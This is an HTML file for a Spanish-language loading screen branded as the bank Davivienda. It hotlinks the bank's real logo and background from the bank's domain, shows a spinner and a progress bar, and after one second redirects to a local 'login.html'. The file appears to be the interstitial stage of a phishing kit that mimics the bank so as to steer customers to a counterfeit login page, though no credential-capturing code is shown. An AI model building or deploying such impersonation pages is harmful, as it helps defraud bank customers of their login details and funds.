<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Davivienda</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Work Sans', 'Segoe UI', 'Roboto', Arial, sans-serif;
    background: url("https://transacciones.davivienda.com/transaccional/javax.faces.resource/fondo-login-web.jpg.jsf?ln=img") no-repeat center center;
    background-size: cover;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  .loader-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    width: 100%;
    padding: 20px;
  }

  .loader-box {
    background: #ffffff;
    border-radius: 16px;
    padding: 48px 40px;
    max-width: 368px;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
  }

  .logo {
    width: 100%;
    max-width: 200px;
    aspect-ratio: 244 / 24;
    background: url("https://transacciones.davivienda.com/transaccional/javax.faces.resource/logo-davivienda.svg.jsf?ln=img") no-repeat center;
    background-size: contain;
    margin-bottom: 40px;
  }

  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #e0e1e3;
    border-top: 4px solid #E1111C;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 24px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loader-text {
    font-size: 18px;
    font-weight: 600;
    color: #404040;
    text-align: center;
  }

  .loader-subtext {
    font-size: 14px;
    font-weight: 400;
    color: #8c8c8c;
    text-align: center;
    margin-top: 8px;
  }

  .progress-bar {
    width: 100%;
    max-width: 200px;
    height: 4px;
    background: #e0e1e3;
    border-radius: 4px;
    margin-top: 24px;
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    background: #E1111C;
    border-radius: 4px;
    animation: fill 1s ease-in-out forwards;
  }

  @keyframes fill {
    to { width: 100%; }
  }

  @media (max-width: 768px) {
    .loader-box { padding: 40px 24px; }
    .logo { max-width: 180px; margin-bottom: 32px; }
  }

  @media (max-width: 390px) {
    .loader-box { padding: 32px 20px; }
    .logo { max-width: 160px; margin-bottom: 28px; }
    .spinner { width: 40px; height: 40px; }
    .loader-text { font-size: 16px; }
  }
</style>
</head>
<body>
<div class="loader-container">
  <div class="loader-box">
    <div class="logo"></div>
    <div class="spinner"></div>
    <p class="loader-text">Cargando...</p>
    <p class="loader-subtext">Estamos preparando todo para ti</p>
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
  </div>
</div>

<script>
  setTimeout(function() {
    window.location.href = 'login.html';
  }, 1000);
</script>
</body>
</html>
